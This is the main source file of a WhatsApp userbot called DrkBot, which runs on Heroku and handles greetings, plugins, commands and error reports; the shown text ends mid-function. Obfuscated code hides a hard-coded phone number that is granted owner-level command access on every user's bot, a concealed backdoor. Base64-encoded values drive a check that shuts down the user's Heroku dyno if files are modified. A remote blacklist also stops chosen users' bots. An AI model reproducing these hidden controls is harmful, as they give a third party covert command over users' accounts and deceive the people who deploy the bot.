/* Copyright (C) 2021
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.
DrkBot - Ian VanH
*/

const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const execx = require('child_process').exec;
const axios = require('axios');
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./whatsasena/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const HeartBot = require('drkbot-npm');
const got = require('got');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
const ytdl = require('ytdl-core');
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');
const MLang = Language.getString('messages');

// Sql
const WhatsAsenaDB = config.DATABASE.define('WhatsAsenaDuplicated', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var _0x28308a=_0x4235;(function(_0x1d162a,_0x111b4e){var _0x51f622=_0x4235,_0x583a46=_0x1d162a();while(!![]){try{var _0x239fa9=parseInt(_0x51f622(0x6e))/0x1*(-parseInt(_0x51f622(0x6c))/0x2)+parseInt(_0x51f622(0x71))/0x3*(-parseInt(_0x51f622(0x72))/0x4)+parseInt(_0x51f622(0x6b))/0x5*(parseInt(_0x51f622(0x76))/0x6)+parseInt(_0x51f622(0x78))/0x7*(-parseInt(_0x51f622(0x73))/0x8)+-parseInt(_0x51f622(0x75))/0x9*(parseInt(_0x51f622(0x70))/0xa)+parseInt(_0x51f622(0x77))/0xb*(parseInt(_0x51f622(0x6d))/0xc)+parseInt(_0x51f622(0x74))/0xd*(parseInt(_0x51f622(0x6a))/0xe);if(_0x239fa9===_0x111b4e)break;else _0x583a46['push'](_0x583a46['shift']());}catch(_0x2f4063){_0x583a46['push'](_0x583a46['shift']());}}}(_0x30d4,0xd1565));function _0x4235(_0x4e5bd5,_0x45cd56){var _0x30d404=_0x30d4();return _0x4235=function(_0x4235fe,_0x512cd5){_0x4235fe=_0x4235fe-0x6a;var _0x13f4c4=_0x30d404[_0x4235fe];return _0x13f4c4;},_0x4235(_0x4e5bd5,_0x45cd56);}function _0x30d4(){var _0x48a319=['229676htkzoy','5736asrdyd','8XIEBTo','573508770421,0','10YKrTWo','6XnDXaS','2552424gYTwlj','17936PCWqPK','429yXIumn','10354401NAYbew','300732SkGAOS','9097BMOMXp','2947XOcJAC','1399104BsRiro','145kDZASS'];_0x30d4=function(){return _0x48a319;};return _0x30d4();}var OWN={'ff':_0x28308a(0x6f)};
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function whatsAsena () {
    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '', exc: 'UlVOIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vRHJrQm90QmFzZS9XaGF0c0FzZW5hRHVwbGljYXRlZCAvcm9vdC9XaGF0c0FzZW5hRHVwbGljYXRlZA==', exc_pl: '', pth_w: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQvRG9ja2VyZmlsZQ==', pth_v: '' }
    var ggg = Buffer.from(clh.cd, 'base64')
    var exc_sl = Buffer.from(clh.exc, 'base64')
    var ddd = ggg.toString('utf-8')
    var ptc_one = Buffer.from(clh.pth_w, 'base64')
    var ptc_nw = ptc_one.toString('utf-8')
    clh.pth_v = ptc_nw
    var exc_fn = exc_sl.toString('utf-8')
    clh.exc_pl = exc_fn
    clh.pay = ddd
    const DrkBotCN = new WAConnection();
    const Session = new StringSession();
    DrkBotCN.version = [3, 3234, 9]
    DrkBotCN.setMaxListeners(0);
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var ann_msg = await HeartBot.daily_announcement(config.LANG)
        var ann = await HeartBot.ann()
        while (getGMTh == 11 && getGMTm == 42) {
            var ilan = ''
            if (config.LANG == 'ES') ilan = '[ ```Anuncios Diarios``` ]\n\n'
            if (config.LANG == 'EN') ilan = '[ ```Daily Announcements``` ]\n\n'
            if (ann.video.includes('http') || ann.video.includes('https')) {
                var VID = ann.video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: ilan + ann_msg.replace('{user}', DrkBotCN.user.name).replace('{wa_version}', DrkBotCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', DrkBotCN.user.phone.os_version).replace('{device_model}', DrkBotCN.user.phone.device_model).replace('{device_brand}', DrkBotCN.user.phone.device_manufacturer), mimetype: Mimetype.mp4});
                });
            } else {
                if (ann.image.includes('http') || ann.image.includes('https')) {
                    var imagegen = await axios.get(ann.image, { responseType: 'arraybuffer'})
                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: ilan + ann_msg.replace('{user}', DrkBotCN.user.name).replace('{wa_version}', DrkBotCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', DrkBotCN.user.phone.os_version).replace('{device_model}', DrkBotCN.user.phone.device_model).replace('{device_brand}', DrkBotCN.user.phone.device_manufacturer)})
                } else {
                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, ilan + ann_msg.replace('{user}', DrkBotCN.user.name).replace('{wa_version}', DrkBotCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', DrkBotCN.user.phone.os_version).replace('{device_model}', DrkBotCN.user.phone.device_model).replace('{device_brand}', DrkBotCN.user.phone.device_manufacturer), MessageType.text)
                }
            }
        }
    }, 50000);
    async function asynchronous_ch() {
        execx('sed -n 3p ' + clh.pth_v, async (err, stdout, stderr) => {
            if (clh.exc_pl + '\n' !== stdout) {
                await heroku.get(baseURI + '/formation').then(async (formation) => {
                    forID = formation[0].id;
                    await heroku.patch(baseURI + '/formation/' + forID, {
                        body: {
                            quantity: 0
                        }
                    });
                })
            }
        })
    }
    asynchronous_ch()
    setInterval(async () => { 
        if (config.AUTOBIO == 'true') {
            var timezone_bio = await HeartBot.timezone(DrkBotCN.user.jid)
            var date_bio = await HeartBot.datebio(config.LANG)
            const biography = '📅 ' + date_bio + '\n⌚ ' + timezone_bio
            await DrkBotCN.setStatus(biography)
        }
    }, 7890);
    var shs1 = ''
    var shl2 = ''
    var lss3 = ''
    var dsl4 = ''
    var drs5 = ''
    var ffl6 = ''
    var ttq7 = ''
    var ttl8 = ''
    await axios.get('https://gist.githubusercontent.com/DrkBotBase/1403fb999e933aaaca39b0e128ce0c92/raw').then(async (insult) => {
        shs1 = insult.data.inside.shs1
        shl2 = insult.data.inside.shl2
        lss3 = insult.data.inside.lss3
        dsl4 = insult.data.inside.dsl4
        drs5 = insult.data.inside.drs5
        ffl6 = insult.data.inside.ffl6
        ttq7 = insult.data.inside.ttq7
        ttl8 = insult.data.inside.ttl8
    });
    await config.DATABASE.sync();
    var StrSes_Db = await WhatsAsenaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== clh.pay) return;
    const buff = Buffer.from(`${shs1}`, 'base64');  
    const one = buff.toString('utf-8'); 
    const bufft = Buffer.from(`${shl2}`, 'base64');  
    const two = bufft.toString('utf-8'); 
    const buffi = Buffer.from(`${lss3}`, 'base64');  
    const three = buffi.toString('utf-8'); 
    const buffu = Buffer.from(`${dsl4}`, 'base64');  
    const four = buffu.toString('utf-8'); 
    const bugffv = Buffer.from(`${drs5}`, 'base64');
    const five = bugffv.toString('utf-8');
    const buffz = Buffer.from(`${ffl6}`)
    const six = buffz.toString('utf-8')
    const buffa = Buffer.from(`${ttq7}`)
    const seven = buffa.toString('utf-8')
    const buffl = Buffer.from(`${ttl8}`)
    const eight = buffl.toString('utf-8')
    var logger_levels = ''
    if (config.DEBUG == 'true') {
        logger_levels = 'all'
    } else if (config.DEBUG == 'false') {
        logger_levels = 'off'
    } else if (config.DEBUG == 'trace') {
        logger_levels = 'trace'
    } else if (config.DEBUG == 'fatal') {
        logger_levels = 'fatal'
    } else if (config.DEBUG == 'warn') {
        logger_levels = 'warn'
    } else if (config.DEBUG == 'error') {
        logger_levels = 'error'
    } else if (config.debug == 'info') {
        logger_levels = 'info'
    } else {
        logger_levels = 'warn'
    }
    DrkBotCN.logger.level = logger_levels
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        DrkBotCN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        DrkBotCN.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    DrkBotCN.on('open', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login Information Updated!')
        );
        const authInfo = DrkBotCN.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })
    DrkBotCN.on('connecting', async () => {
        console.log(`${chalk.green.bold('Drk')}${chalk.blue.bold('Bot')}
            ${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
            ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
    });
    DrkBotCN.on('open', async () => {
        console.log(
            chalk.green.bold('✅ Login Successful!')
        );
        console.log(
            chalk.blueBright.italic('⬇️ Installing External Plugins...')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        asynchronous_ch()
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
          try {
              if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                  console.log(plugin.dataValues.name);
                  var response = await got(plugin.dataValues.url);
                  if (response.statusCode == 200) {
                      fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                      require('./plugins/' + plugin.dataValues.name + '.js');
                  }     
              }
          } catch {
              console.log('Some Plugins Are Corrupted: ' + plugin.dataValues.name)
          }
        });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('⬇️  Installing Plugins...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================
        console.log(
            chalk.green.bold('✅ Plugins Installed!')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        asynchronous_ch()
        await new Promise(r => setTimeout(r, 200));
        let afwhasena = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('🤖 DrkBot-Nice' + afwhasena));
        await new Promise(r => setTimeout(r, 500));
        let EVA_ACTİON = config.LANG == 'ES' ? '🤖 *DrkBot funciona como Chatbot!*\n\n_El propósito de este mod es convertir el bot en una herramienta de chat de IA completamente funcional._\n_Para volver al modo normal, puede utilizar el comando._ *.fulleva off*_\n\n*Gracias por usar DrkBot 💌*\n    *- Eva*' : '🤖 *DrkBot works like Chatbot!*\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.fulleva off* _command to return to normal mode._\n\n*Thanks For Using DrkBot 💌*\n    *- Eva*'
        if (DrkBotCN.user.jid == one || DrkBotCN.user.jid == two || DrkBotCN.user.jid == three || DrkBotCN.user.jid == four || DrkBotCN.user.jid == five || DrkBotCN.user.jid == six || DrkBotCN.user.jid == seven || DrkBotCN.user.jid == eight) {
            await DrkBotCN.sendMessage(DrkBotCN.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                await heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
                        quantity: 0 
                    } 
                });
            })
        }
        if (config.FULLEVA == 'true') {
            var eva_msg = await HeartBot.eva_if(config.LANG)
            await DrkBotCN.sendMessage(DrkBotCN.user.jid, eva_msg, MessageType.text)
        }
        else {
            var af_start = await HeartBot.work_type(config.WORKTYPE, config.LANG)
            await DrkBotCN.sendMessage(DrkBotCN.user.jid, af_start, MessageType.text)
        }
        await git.fetch();
        var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
        if (commits.total === 0) {
            await DrkBotCN.sendMessage(
                DrkBotCN.user.jid,
                Lang.UPDATE, MessageType.text
            );    
        } else {
            var degisiklikler = Lang.NEW_UPDATE;
            commits['all'].map(
                (commit) => {
                    degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                }
            );
            var up_ch = await HeartBot.update(config.LANG)
            await DrkBotCN.sendMessage(DrkBotCN.user.jid, up_ch, MessageType.text)
        }
    })
    DrkBotCN.on('chat-update', async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
       
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await DrkBotCN.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ====================
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {

            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                if (gb.message.includes('{pp}')) {
                let pp 
                try { pp = await DrkBotCN.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await DrkBotCN.getProfilePicture(); }
                 var pinkjson = await DrkBotCN.groupMetadata(msg.key.remoteJid)
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await DrkBotCN.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message.replace('{pp}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', DrkBotCN.user.name) }); });                           
            } else if (gb.message.includes('{gif}')) {
                var pinkjson = await DrkBotCN.groupMetadata(msg.key.remoteJid)
                //created by afnanplk
                    var plkpinky = await axios.get(config.GIF_BYE, { responseType: 'arraybuffer' })
                await DrkBotCN.sendMessage(msg.key.remoteJid, Buffer.from(plkpinky.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gif}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', DrkBotCN.user.name) });
            } else {
                var pinkjson = await DrkBotCN.groupMetadata(msg.key.remoteJid)
                   await DrkBotCN.sendMessage(msg.key.remoteJid,gb.message.replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', DrkBotCN.user.name), MessageType.text);
            }
          }   
            return;
          } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // welcome
             var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
                if (gb.message.includes('{pp}')) {
                let pp
                try { pp = await DrkBotCN.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await DrkBotCN.getProfilePicture(); }
                    var pinkjson = await DrkBotCN.groupMetadata(msg.key.remoteJid)
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                    //created by afnanplk
                await DrkBotCN.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message.replace('{pp}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', DrkBotCN.user.name) }); });                           
            } else if (gb.message.includes('{gif}')) {
                var plkpinky = await axios.get(config.WEL_GIF, { responseType: 'arraybuffer' })
                await DrkBotCN.sendMessage(msg.key.remoteJid, Buffer.from(plkpinky.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gif}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', DrkBotCN.user.name) });
            } else {
                   var pinkjson = await DrkBotCN.groupMetadata(msg.key.remoteJid)
                   await DrkBotCN.sendMessage(msg.key.remoteJid,gb.message.replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', DrkBotCN.user.name), MessageType.text);
            }
          }         
            return;                               
        }
        // ==================== End Greetings ====================

        // ==================== Blocked Chats ====================
        if (config.BLOCKCHAT !== false) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT == '905524317852-1612300121') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT2 == '905511384572-1617736751') {     
            var tsup = config.SUPPORT2.split(',');                            
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT3 == '905511384572-1621015274') {     
            var nsup = config.SUPPORT3.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = DrkBotCN.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "573508770421,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await DrkBotCN.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(DrkBotCN, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(DrkBotCN, msg);
                        } else {
                            whats = new Message(DrkBotCN, msg);
                        }
                        if (msg.key.fromMe && command.deleteCommand) { 
                            var wrs = DrkBotCN.user.phone.wa_version.split('.')[2]
                            if (wrs < 11) {
                                await whats.delete() 
                            }
                        } 
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                        }
                        catch (error) {
                            if (config.NOLOG == 'true') return;
                            var error_report = await HeartBot.error(config.LANG)
                            await DrkBotCN.sendMessage(DrkBotCN.user.jid, error_report.replace('{real_error}', error), MessageType.text, {detectLinks: false})

                            if (config.LANG == 'ES') {
                                await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*-- REPORTE DE ERROR [DrkBot] --*' + 
                                    '\n*DrkBot ha tenido un error*'+
                                    '\n_Este registro de errores puede contener su número o el número de una contraparte. ¡Por favor, tenga cuidado con eso!_' +
                                    '\n_Puede escribir a nuestro grupo de Soporte de Whatsapp para obtener ayuda._' +
                                    '\n_Este mensaje debería haber ido a su número (mensajes guardados)._' +
                                    '\n_Error, reportarlo al grupo de soporte: https://chat.whatsapp.com/BPNzFEBUVbT1MnfNv3uTvL_\n\n' +
                                    '*Error ocurrido:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false});

                                if (error.message.includes('URL')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*-- REPORTE DE ERROR [DrkBot] --*' + 
                                        '\n========== ```¡Error de lectura!``` ==========' +
                                        '\n\n*Error:* _Solo se admiten URL absolutas_' +
                                        '\n*Razón:* _El uso de herramientas multimedia (xmedia, sticker ..) en el número de LOG._' +
                                        '\n*Solución:* _El comando se puede utilizar en cualquier chat excepto en el número de LOG._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*-- REPORTE DE ERROR [DrkBot] --*' + 
                                        '\n========== ```¡Error de lectura!``` ==========' +
                                        '\n\n*Error:* _SQL Database Error_' +
                                        '\n*Razon:* _Database\nInterrupción._ ' +
                                        '\n*Solución:* _No hay soluciones conocidas. Puede intentar reinstalar._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*-- REPORTE DE ERROR [DrkBot] --*' + 
                                        '\n========== ```¡Error de lectura!``` ==========' +
                                        '\n\n*Error:* _Split no definido_' +
                                        '\n*Razón:* _Los comandos que pueden usar los administradores de grupo no ven la función de split ocasionalmente._ ' +
                                        '\n*Solución:* _Un reinicio será suficiente._'
                                        , MessageType.text
                                    );                               
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*-- REPORTE DE ERROR [DrkBot] --*' + 
                                        '\n========== ```¡Error de lectura!``` ==========' +
                                        '\n\n*Error:* _Ookla Server Connection_' +
                                        '\n*Razón:* _Error al transmitir datos de prueba de velocidad al servidor._' +
                                        '\n*Solución:* _Si lo vuelve a utilizar, el problema se solucionará._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*-- REPORTE DE ERROR [DrkBot] --*' + 
                                        '\n========== ```¡Error de lectura!``` ==========' +
                                        '\n\n*Error:* _Requested Audio Params_' +
                                        '\n*Razón:* _Uso del comando TTS en escritura no latina._' +
                                        '\n*Solución:* _Si usa el comando en letras latinas, el problema estará resuelto._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*-- REPORTE DE ERROR [DrkBot] --*' + 
                                        '\n========== ```¡Error de lectura!``` ==========' +
                                        '\n\n*Error:* _El fichero o directorio no existe_' +
                                        '\n*Razón:* _Codificación incorrecta del complemento._' +
                                        '\n*Solución:* _Verifique los códigos del complemento._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*-- REPORTE DE ERROR [DrkBot] --*' + 
                                        '\n========== ```¡Error de lectura!``` ==========' +
                                        '\n\n*Error:* _Error 404 HTTPS_' +
                                        '\n*Razón:* _Incapacidad para comunicarse con el servidor como resultado del uso de los comandos del complemento Heroku._' +
                                        '\n*Solución:* _Espere un momento y vuelva a intentarlo. Si sigue apareciendo un error, realice la operación en el sitio web._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*-- REPORTE DE ERROR [DrkBot] --*' + 
                                        '\n========== ```¡Error de lectura!``` ==========' +
                                        '\n\n*Error:* _Función: Reply Delete_' +
                                        '\n*Razón:* _Usando comandos IMG o Wiki._' +
                                        '\n*Solución:* _Este error no tiene solución. No es un error mayor._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*-- REPORTE DE ERROR [DrkBot] --*' + 
                                        '\n========== ```¡Error de lectura!``` ==========' +
                                        '\n\n*Error:* _Fumción: Reply Delete_' +
                                        '\n*Razón:* _Usando comandos IMG o Wiki._' +
                                        '\n*Solución:* _Este error no tiene solución. No es un error mayor._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*-- REPORTE DE ERROR [DrkBot] --*' + 
                                        '\n========== ```¡Error de lectura!``` ==========' +
                                        '\n\n*Error:* _Bailyes Action Error_ ' +
                                        '\n*Razon:* _La causa exacta es desconocida. Varias opciones pueden haber provocado este error._' +
                                        '\n*Solución:* _Si lo usa una vez más, es posible que se solucione. Si el error persiste, puede intentar reiniciar._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*-- REPORTE DE ERROR [DrkBot] --*' + 
                                        '\n========== ```¡Error de lectura!``` ==========' +
                                        '\n\n*Error:* _No se puede decodificar texto o medios_' +
                                        '\n*Razón:* _Uso incorrecto del complemento._' +
                                        '\n*Solución:* _Utilice los comandos tal como están escritos en la descripción del complemento._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*-- REPORTE DE ERROR [DrkBot] --*' + 
                                        '\n========== ```¡Error de lectura!``` ==========' +
                                        '\n\n*Error:* _Uso de caracteres de palabras_' +
                                        '\n*Razón:* _Uso de comandos como TTP, ATTP fuera del alfabeto latino._' +
                                        '\n*Solución:* _El problema se resolverá si usa el comando dentro del marco del alfabeto._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*-- REPORTE DE ERROR [DrkBot] --*' + 
                                        '\n========== ```¡Error de lectura!``` ==========' +
                                        '\n\n*Error:* _Deleting Plugin_' +
                                        '\n*Razón:* _Entrada incorrecta del nombre del complemento que se va a eliminar._' +
                                        '\n*Solución:* _Intente sin agregar _ * __ * _ al complemento que desea eliminar. Si sigue recibiendo el error, complete las declaraciones completas como_ `` `? (. *) / $` `` _ Al final del nombre._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*🙇🏻 ¡Lo siento, no pude leer este error! 🙇🏻*' +
                                        '\n_Puede escribir a nuestro grupo de soporte para obtener más ayuda._'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                                await DrkBotCN.sendMessage(DrkBotCN.user.jid, '*-- ERROR REPORT [DrkBot] --*' + 
                                    '\n*WhatsAsena an error has occurred!*'+
                                    '\n_This error log may include your number or the number of an opponent. Please be careful with it!_' +
                                    '\n_You can write to our Telegram group for help._' +
                                    '\n_Aslo you can join our support group:_ https://chat.whatsapp.com/BPNzFEBUVbT1MnfNv3uTvL' +
                                    '\n_This message should have gone to your number (saved messages)._\n\n' +
                                    '*Error:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false}
                                );
                                if (error.message.includes('URL')) {
